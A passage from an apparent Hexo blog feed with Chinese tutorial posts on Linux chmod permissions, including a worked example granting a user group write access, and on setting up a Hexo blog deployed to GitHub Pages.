prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs prolog">chmod [-cfvR] [--help] [--version] mode file...<br></code></pre></td></tr></table></figure><p><strong>参数说明</strong></p><p>mode : 权限设定字串，格式如下</p><figure class="highlight inform7"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs inform7"><span class="hljs-comment">[ugoa...]</span><span class="hljs-comment">[<span class="hljs-comment">[+-=]</span><span class="hljs-comment">[rwxX]</span>...]</span><span class="hljs-comment">[,...]</span><br></code></pre></td></tr></table></figure><p><strong>解释：</strong></p><p>u 表示该档案的拥有者，g 表示与该档案的拥有者属于同一个群体(group)者，o 表示其他以外的人，a 表示这三者皆是。</p><p>+表示增加权限、- 表示取消权限、= 表示唯一设定权限。<br>r 表示可读取，w 表示可写入，x 表示可执行，X 表示只有当该档案是个子目录或者该档案已经被设定过为可执行。</p><h4 id="1-数字权限"><strong>1) 数字权限</strong></h4><p>Linux文件的基本权限就有九个，分别是owner/group/others三种身份各有自己的read/write/execute权限。</p><p>先复习一下刚刚上面提到的数据：文件的权限字符为：『-rwxrwxrwx』， 这九个权限是三个三个一组（owner/group/others就是所说的三个一组 ）的，我们也可以使用数字来代表各个权限，各权限的分数对照表如下</p><p>各权限的数字对照表：[r]:4;[w]:2;[x]:1;[-]:<strong>0</strong></p><p><img src="/2022/12/29/Linux%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-1/1576571902684.png" alt="1576571902684"></p><p>每种身份(owner/group/others)各自的三个权限(r/w/x)分数是需要累加的，例如当权限为： [-rwxrwx—] 分数则是：</p><ul class="lvl-0"><li class="lvl-2"><p>owner = rwx = 4+2+1 = 7</p></li><li class="lvl-2"><p>group = rwx = 4+2+1 = 7</p></li><li class="lvl-2"><p>others= — = 0+0+0 = 0</p></li></ul><p>所以等一下我们设定权限的变更时，该文件的权限数字就是770啦,变更权限的指令chmod的语法是这样的</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">chmod</span> [-R] xyz 文件或目录<br></code></pre></td></tr></table></figure><p>选项与参数：</p><ul class="lvl-0"><li class="lvl-2"><p>xyz : 就是刚刚提到的数字类型的权限属性，为 rwx 属性数值的相加。</p></li><li class="lvl-2"><p>-R : 进行递归(recursive)的持续变更，亦即连同次目录下的所有文件都会变更</p></li></ul><p>上面的 可以表示如下</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">chmod  -R 770     档案或目录<br></code></pre></td></tr></table></figure><blockquote><p>上面说了这么多，我们举例说明一下：</p></blockquote><p>我们进入itcast用户创建文件czbk.txt</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">touch as.txt<br></code></pre></td></tr></table></figure><p>然后切换到root</p><p>比如，我们如果要将as.txt这个文件所有的权限都设定启用</p><p><img src="/2022/12/29/Linux%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-1/1576463267777.png" alt="1576463267777"></p><p>那么命令如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">chmod -R 777 as.txt<br></code></pre></td></tr></table></figure><p><img src="/2022/12/29/Linux%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-1/1576463303277.png" alt="1576463303277"></p><p>由此可见，as.txt的属主权限、属组权限、其他权限都发生了改变</p><p>由之前的【-rw-rw-r–】变成【-rwxrwxrwx】</p><blockquote><p>根据前面的换算我们已经知道如何将一个文件的属主、属组、其他权限换算成数字了，换算成数字后，我们只需要通过chmod命令即可更改文件的权限</p></blockquote><h4 id="2-符号权限"><strong>2) 符号权限</strong></h4><p>还有一个改变权限的方法，就是 符号权限，我们先回顾下之前提到的9个权限</p><ul class="lvl-0"><li class="lvl-2"><p>(1)user     属主权限</p></li><li class="lvl-2"><p>(2)group  属组权限</p></li><li class="lvl-2"><p>(3)others  其他权限</p></li></ul><p>那么我们就可以使用 <strong>u, g, o</strong> 来代表三种身份的权限！</p><p>此外， <strong>a</strong> 则代表 <strong>all</strong>，即全部的身份。读写的权限可以写成 <strong>r, w, x</strong>，也就是可以使用下表的方式来看</p><p><img src="/2022/12/29/Linux%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-1/1576464280724.png" alt="1576464280724"></p><p>如果我们需要将文件权限设置为 <strong>-rwxr-xr–</strong> ，可以使用 <strong>chmod u=rwx,g=rx,o=r 文件名</strong> 来设定:</p><p>上接上面的例子，如下图</p><p>我们将as.txt的权限设置为**-rwxr-xr–**</p><p><img src="/2022/12/29/Linux%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-1/1576464462903.png" alt="1576464462903"></p><p>执行</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">chmod u=rwx,g=rx,o=r  as.txt<br></code></pre></td></tr></table></figure><p><img src="/2022/12/29/Linux%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-1/1576464626496.png" alt="1576464626496"></p><p>由上图我们发现，as.txt的权限变成了-rwxr-xr–</p><p>假如我们要将权限去掉而不改变其他已存在的权限呢？举个例子，比如我要拿掉全部人的可读权限，则</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs SHELL">chmod  a-r as.txt<br></code></pre></td></tr></table></figure><p>执行如下</p><p><img src="/2022/12/29/Linux%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-1/1576464852969.png" alt="1576464852969"></p><p>由此可见，as.txt的其他权限都没有了，变成了【—】</p><h2 id="3-4-综合案例">3.4 综合案例</h2><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">在前面的章节中我们讲解了用户、用户组、文件属主、属组以及权限，知识点比较零散，下面，我们就通过一个简单小案例把这些知识点串联起来<br></code></pre></td></tr></table></figure><p><strong>需求：</strong></p><p>比如一个公司的开发团队有三个用户：java、erlang、golang有一个文件目录tmp/work供他们开发，如何实现让这三个用户都对其具有写权限</p><p><strong>1、首先，我们创建三个账户</strong>（切换到root）</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">adduser java<br>adduser erlang<br>adduser golang<br></code></pre></td></tr></table></figure><p>执行效果如下</p><p><img src="/2022/12/29/Linux%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-1/1576587867858.png" alt="1576587867858"></p><p><strong>2、增加用户组</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">groupadd -g 8888 dev-group<br></code></pre></td></tr></table></figure><p>执行效果如下</p><p><img src="/2022/12/29/Linux%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-1/1576588353612.png" alt="1576588353612"></p><p><strong>3、创建公共文件并设置权限</strong></p><p>给文件/tmp/project2019/设置属组为dev-group</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell">mkdir /tmp/project2019<br><br>chown -R :dev-group /tmp/project2019/<br>或者<br>chgrp -R dev-group  /tmp/project2019/<br></code></pre></td></tr></table></figure><p>执行效果如下</p><p><img src="/2022/12/29/Linux%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-1/1576588480909.png" alt="1576588480909"></p><p><strong>4、将用户添加到组</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">gpasswd -a java    dev-group<br>gpasswd -a erlang  dev-group<br>gpasswd -a golang  dev-group<br></code></pre></td></tr></table></figure><p>执行效果如下</p><p><img src="/2022/12/29/Linux%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-1/1576588553969.png" alt="1576588553969"></p><p>查询dev-group组下所有用户</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">grep &#x27;dev-group&#x27; /etc/group<br></code></pre></td></tr></table></figure><p>执行效果如下</p><p><img src="/2022/12/29/Linux%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-1/1576588591503.png" alt="1576588591503"></p><p><strong>5、切换到java用户</strong></p><p>切换到java用户看看是否有写入权限</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">su java<br></code></pre></td></tr></table></figure><p><img src="/2022/12/29/Linux%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-1/1576588731114.png" alt="1576588731114"></p><p>新建文件</p><p>在我们上面创建的目录tmp/project2019/下面创建文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">mkdir java-files-new<br></code></pre></td></tr></table></figure><p><img src="/2022/12/29/Linux%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-1/1576588941546.png" alt="1576588941546"></p><p>由此发现，我们在tmp/project2019/下面创建文件发生了权限不足，我们去查看下tmp/project2019/的文件属性，如下图</p><p>我们在/tmp目录下执行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">ls</span> -l<br></code></pre></td></tr></table></figure><p>执行效果如下</p><p><img src="/2022/12/29/Linux%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-1/1576589157095.png" alt="1576589157095"></p><p>我们发现目录project2019的文件属性为【drwxr-xr-x】</p><p>根据前面学的知识，我们拆分如下</p><p>【d】:文件类型</p><p>【rwx】：属主</p><p>【r-x】：属组</p><p>【r-x】：其他</p><p>现在答案就出来了，也就是说我们的属组权限是【r-x】，只有读和执行权限，没有写入权限，那么下面我们就给project2019目录增加写入权限。</p><p><strong>6、增加写入权限</strong></p><p>给project2019目录增加写入权限，执行下面的命令（前面已经学习过了）</p><p>记得切换到root下执行</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">chmod  -R 770  project2019<br></code></pre></td></tr></table></figure><p>执行效果如下<img src="/2022/12/29/Linux%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-1/1576589467908.png" alt="1576589467908"></p><p>此时我们发现project2019目录的属组权限变成了【rwx】即可读、可写、可执行</p><p><strong>7、切换用户，继续写入</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">su  java<br>mkdir java-files-new<br>ls -l<br></code></pre></td></tr></table></figure><p>执行效果如下</p><p><img src="/2022/12/29/Linux%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-1/1576589641341.png" alt="1576589641341"></p><p>由此发现，这个时候我们有了写入权限，java-files-new文件被成功写入</p><p>那么，其他两个用户golang、erlang也是和java一个组的，他们能不能正常写入呢，我们试试（从root切换过去）</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs shell">su<br>su erlang<br>mkdir erlang-files-new<br>==============================<br>su<br>su golang<br>mkdir golang-files-new<br><br>ls -l<br></code></pre></td></tr></table></figure><p>执行效果（erlang新建文件）</p><p><img src="/2022/12/29/Linux%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-1/1576589820604.png" alt="1576589820604"></p><p>执行效果（golanglang新建文件）</p><p><img src="/2022/12/29/Linux%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-1/1576589856968.png" alt="1576589856968"></p><p>查看所有文件</p><p><img src="/2022/12/29/Linux%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-1/1576589903617.png" alt="1576589903617"></p><p>由此可见，我们组的三个用户都成功创建了文件（拥有了写入权限）</p><p><strong>8、验证结论</strong></p><p>为了验证上面的结论，我们新增一个用户itbeijing</p><p>看看能否正常新建文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">useradd   itbeijing<br>su itbeijing<br>mkdir  itbeijing-files-new<br></code></pre></td></tr></table></figure><p>执行效果如下</p><p><img src="/2022/12/29/Linux%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-1/1576590031376.png" alt="1576590031376"></p><p>由上图我们发现，我们刚刚新创建的用户在创建文件的时候发现了权限不足。</p><p>由此说明用户itbeijing用户的属组和文件的属组不一样，所以没有权限。</p><h2 id="3-5-总结">3.5 总结</h2><p>在企业级开发过程中，实际操作目录是最经常出现的，对于目录常用命令我们要熟练掌握并能熟练编写因为Linux是多用户系统，所以权限也是非常核心和重要的，我们要熟练编写权限（属主、属组、其他权限）的常用命令。</p>]]></content>
    
    
    <categories>
      
      <category>运维</category>
      
    </categories>
    
    
    <tags>
      
      <tag>运维</tag>
      
      <tag>Linux</tag>
      
      <tag>操作系统</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Hexo+GitHub博客搭建</title>
    <link href="/2022/12/29/Hexo+GitHub%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/"/>
    <url>/2022/12/29/Hexo+GitHub%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/</url>
    
    <content type="html"><![CDATA[<h2 id="准备工作">准备工作</h2><ol><li class="lvl-3">Git配置</li></ol><blockquote><p>git config --global <a href="http://user.name">user.name</a> “Your Name”<br>git config --global user.email “<a href="mailto:email@example.com">email@example.com</a>”<br>官网下载链接: <a href="https://git-scm.com/downloads">https://git-scm.com/downloads</a></p></blockquote><ol start="2"><li class="lvl-3">nodeJs</li></ol><blockquote><p>node  -v<br>npm -v<br>(回显版本号则成功)<br>官网下载链接：<a href="https://nodejs.org/zh-cn/download/">https://nodejs.org/zh-cn/download/</a></p></blockquote><h2 id="博客服务">博客服务</h2><ol><li class="lvl-3"><p>安装hexo</p></li></ol><blockquote><p>npm install hexo-cli -g</p></blockquote><ol start="2"><li class="lvl-3"><p>初始化博客</p></li></ol><blockquote><p>hexo init myblog # 初始化<br>cd myblog # 进入博客目录<br>npm install # 安装服务</p></blockquote><ol start="3"><li class="lvl-3"><p>启动</p></li></ol><blockquote><p>hexo g # 生成<br>hexo s # 启动</p></blockquote><h2 id="GitHub配置">GitHub配置</h2><blockquote><p>ssh-keygen -t rsa -C “github邮箱” # 生成密钥</p></blockquote><p>访问 C:\User\用户名.ssh 里面有两个文件, 打开公钥id_rsa.pub, 复制里面内容粘贴到GitHub个人主页 -&gt; Setting -&gt; SSH and GPG Keys -&gt; New SSH Key 中</p><blockquote><p>ssh -T <a href="mailto:git@github.com">git@github.com</a> # 测试是否连通</p></blockquote><p>修改博客文件夹下的_congih.yml文件<br><strong><a href="http://xn--+-br6a0s58hg3cba969prxak7so94cied.github.io">创建的仓库名为用户名+.github.io</a></strong></p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-comment"># Deployment</span><br><span class="hljs-comment">## Docs: https://hexo.io/docs/one-command-deployment</span><br><span class="hljs-attr">deploy:</span><br>  <span class="hljs-attr">type:</span> <span class="hljs-string">git</span><br>  <span class="hljs-attr">repository:</span> <span class="hljs-string">https://github.com/xxxxx/xxxxx.github.io.git</span>  <span class="hljs-comment"># 仓库地址</span><br>  <span class="hljs-attr">branch:</span> <span class="hljs-string">main</span><br></code></pre></td></tr></table></figure><blockquote><p>npm install hexo-deployer-git --save # 安装git服务<br>hexo d # 发布</p></blockquote><h2 id="博客页内信息">博客页内信息</h2><table><thead><tr><th>参数</th><th>描述</th><th>默认值</th></tr></thead><tbody><tr><td><code>layout</code></td><td>布局</td><td><code>[config.default_layout](https://hexo.io/zh-cn/docs/configuration#%E6%96%87%E7%AB%A0)</code></td></tr><tr><td><code>title</code></td><td>标题</td><td>文章的文件名</td></tr><tr><td><code>date</code></td><td>建立日期</td><td>文件建立日期</td></tr><tr><td><code>updated</code></td><td>更新日期</td><td>文件更新日期</td></tr><tr><td><code>comments</code></td><td>开启文章的评论功能</td><td>true</td></tr><tr><td><code>tags</code></td><td>标签（不适用于分页）</td><td></td></tr><tr><td><code>categories</code></td><td>分类（不适用于分页）</td><td></td></tr><tr><td><code>permalink</code></td><td>覆盖文章网址</td><td></td></tr><tr><td><code>excerpt</code></td><td>纯文本的页面摘要。使用 <a href="https://hexo.io/zh-cn/docs/tag-plugins#%E6%96%87%E7%AB%A0%E6%91%98%E8%A6%81%E5%92%8C%E6%88%AA%E6%96%AD">该插件</a></td><td></td></tr><tr><td>来格式化文本</td><td></td><td></td></tr><tr><td><code>disableNunjucks</code></td><td>启用时禁用 Nunjucks 标签 <code>&#123;&#123; &#125;&#125;</code></td><td></td></tr><tr><td>/<code>&#123;% %&#125;</code></td><td></td><td></td></tr><tr><td>和 <a href="https://hexo.io/zh-cn/docs/tag-plugins">标签插件</a></td><td></td><td></td></tr><tr><td>的渲染功能</td><td></td><td></td></tr><tr><td><code>lang</code></td><td>设置语言以覆盖 <a href="https://hexo.io/zh-cn/docs/internationalization#%E8%B7%AF%E5%BE%84">自动检测</a></td><td>继承自 <code>_config.yml</code></td></tr></tbody></table><h2 id="分类和标签">分类和标签</h2><p>只有文章支持分类和标签，您可以在 Front-matter 中设置。在其他系统中，分类和标签听起来很接近，但是在 Hexo 中两者有着明显的差别：分类具有顺序性和层次性，也就是说 <code>Foo, Bar</code> 不等于 <code>Bar, Foo</code>；而标签没有顺序和层次。</p><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs subunit">categories:<br>- Diary<br><span class="hljs-keyword">tags:</span><br>- PS3<br>- Games<br></code></pre></td></tr></table></figure><p><strong>分类方法的分歧</strong></p><p>如果您有过使用 WordPress 的经验，就很容易误解 Hexo 的分类方式。WordPress 支持对一篇文章设置多个分类，而且这些分类可以是同级的，也可以是父子分类。但是 Hexo 不支持指定多个同级分类。下面的指定方法：</p><figure class="highlight nestedtext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs nestedtext"><span class="hljs-attribute">categories</span><span class="hljs-punctuation">:</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">Diary</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">Life</span><br></code></pre></td></tr></table></figure><p>会使分类 <code>Life</code> 成为 <code>Diary</code> 的子分类，而不是并列分类。因此，有必要为您的文章选择尽可能准确的分类。</p><p>如果你需要为文章添加多个分类，可以尝试以下 list 中的方法。</p><figure class="highlight ldif"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs ldif"><span class="hljs-attribute">categories</span>:<br><span class="hljs-literal">-</span> [Diary, PlayStation]<br><span class="hljs-literal">-</span> [Diary, Games]<br><span class="hljs-literal">-</span> [Life]<br></code></pre></td></tr></table></figure><p>此时这篇文章同时包括三个分类： <code>PlayStation</code> 和 <code>Games</code> 分别都是父分类 <code>Diary</code> 的子分类，同时 <code>Life</code> 是一个没有子分类的分类。</p><h2 id="踩坑">踩坑</h2><ol><li class="lvl-3"><p>博客不显示图床的图片</p></li></ol><p>找到你的Hexo主题里面设置全局网页head信息的文件，我使用的fuild主题 这个配置文件在themes\hexo-theme-fluid-master\layout_partialshead.ejs中，在文件中添加</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">&lt;meta name=<span class="hljs-string">&quot;referrer&quot;</span> content=<span class="hljs-string">&quot;no-referrer&quot;</span>&gt;<br></code></pre></td></tr></table></figure><ol start="2"><li class="lvl-4"><p>本地图片不显示问题</p></li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">1. _config.yml文件修改post_asser_folder为<span class="hljs-literal">true</span><br>2. 在博客md文件同文件夹中建立与其相同名的文件夹存放图片<br>(typora在偏好设置-图像里面可以设置为复制到指定路径 ./$(filename)/)<br></code></pre></td></tr></table></figure><ol start="3"><li class="lvl-3"><p>美化问题</p></li></ol><p>自定义CSS需要在:\themes\hexo-theme-fluid-master\source\css\main.styl中写</p><ol start="4"><li class="lvl-3"><p>跟换markdown渲染器</p></li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs bash">npm un hexo-renderer-marked --save<br>npm i hexo-renderer-markdown-it --save<br><br><span class="hljs-comment"># 将如下文本复制粘贴到 Hexo 的配置文件 _config.yml 的尾部</span><br>markdown:<br>  preset: <span class="hljs-string">&quot;default&quot;</span><br>  render:<br>    html: <span class="hljs-literal">true</span><br>    xhtmlOut: <span class="hljs-literal">false</span><br>    langPrefix: <span class="hljs-string">&quot;language-&quot;</span><br>    breaks: <span class="hljs-literal">true</span><br>    linkify: <span class="hljs-literal">true</span><br>    typographer: <span class="hljs-literal">true</span><br>    quotes: <span class="hljs-string">&quot;“”‘’&quot;</span><br>  enable_rules:<br>  disable_rules:<br>  plugins:<br>    - markdown-it-abbr<br>    - markdown-it-cjk-breaks<br>    - markdown-it-deflist<br>    - markdown-it-emoji<br>    - markdown-it-footnote<br>    - markdown-it-ins<br>    - markdown-it-mark<br>    - markdown-it-sub<br>    - markdown-it-sup<br>    - markdown-it-checkbox<br>    - markdown-it-imsize<br>    - markdown-it-expandable<br>    - name: markdown-it-container<br>      options: success<br>    - name: markdown-it-container<br>      options: tips<br>    - name: markdown-it-container<br>      options: warning<br>    - name: markdown-it-container<br>      options: danger<br>  anchors:<br>    level: 2<br>    collisionSuffix: <span class="hljs-string">&quot;&quot;</span><br>    permalink: <span class="hljs-literal">false</span><br>    permalinkClass: <span class="hljs-string">&quot;header-anchor&quot;</span><br>    permalinkSide: <span class="hljs-string">&quot;left&quot;</span><br>    permalinkSymbol: <span class="hljs-string">&quot;¶&quot;</span><br>    <span class="hljs-keyword">case</span>: 0<br>    separator: <span class="hljs-string">&quot;-&quot;</span><br><br><span class="hljs-comment"># 安装插件</span><br>npm i markdown-it-checkbox<br>npm i markdown-it-imsize<br>npm i markdown-it-expandable<br><br><br></code></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2023/png/12889352/1675862199664-f9c8d73e-addc-4b44-9076-447767ea596f.png#averageHue=%23f7f7f6&amp;clientId=u7b4fb406-15fe-4&amp;from=paste&amp;height=453&amp;id=u327f200e&amp;name=image.png&amp;originHeight=566&amp;originWidth=1193&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=55950&amp;status=done&amp;style=none&amp;taskId=u0e327dff-1867-4fb0-b79d-73739bfc28c&amp;title=&amp;width=954.4" alt="image.png"></p><ol start="5"><li class="lvl-3"><p>自定义容器</p></li></ol><p>更换渲染器安装的里面自带 markdown-it-container：自定义容器插件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 语法</span><br>::: tips<br>**提示**<br>这是一个提示<br>:::<br><br>::: warning<br>**注意**<br>这是一个警告<br>:::<br><br>::: danger<br>**警告**<br>这是一个危险信号<br>:::<br><br>::: success<br>**成功**<br>这是一个成功信号<br>:::<br><br><span class="hljs-comment"># CSS文件修改样式</span><br><span class="hljs-comment"># \themes\hexo-theme-fluid-master\source\css\main.styl中写</span><br>.tips &#123;<br>    padding-left: 10px;<br>    background-color rgba(52,152,219,.3);<br>    border-left 4px solid rgb(52,152,219);<br>    color: darken(rgb(52,152,219),20%);<br>&#125;<br>.success &#123;<br>    padding-left: 10px;<br>    background-color rgba(46,204,113,.3);<br>    border-left 4px solid rgb(46,204,113);<br>    color: darken(rgb(46,204,113),20%);<br>&#125;<br>.warning &#123;<br>    padding-left: 10px;<br>    background-color rgba(241,196,15,.3);<br>    border-left 4px solid rgb(241,196,15);<br>    color: darken(rgb(241,196,15),20%);<br>&#125;<br>.danger &#123;<br>    padding-left: 10px;<br>    background-color rgba(231,76,60,.3);<br>    border-left 4px solid rgb(231,76,60);<br>    color: darken(rgb(231,76,60),20%);<br>&#125;<br></code></pre></td></tr></table></figure><p>样式展示<br><img src="https://cdn.nlark.com/yuque/0/2023/png/12889352/1675862237748-96cd99a2-7107-4e99-aca0-d86e733707d7.png#averageHue=%23faecb6&amp;clientId=u7b4fb406-15fe-4&amp;from=paste&amp;height=304&amp;id=ufb894328&amp;name=image.png&amp;originHeight=380&amp;originWidth=1192&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=29570&amp;status=done&amp;style=none&amp;taskId=u37c61932-b3d2-4de9-86fd-f6f5cdeae88&amp;title=&amp;width=953.6" alt="image.png"></p>]]></content>
    
    
    <categories>
      
      <category>运维</category>
      
    </categories>
    
    
    <tags>
      
      <tag>运维</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Hello World</title>
    <link href="/2022/12/28/hello-world/"/>
    <url>/2022/12/28/hello-world/</url>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start">Quick Start</h2><h3 id="Create-a-new-post">Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo new <span class="hljs-string">&quot;My New Post&quot;</span><br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server">Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo server<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files">Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo generate<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites">Deploy 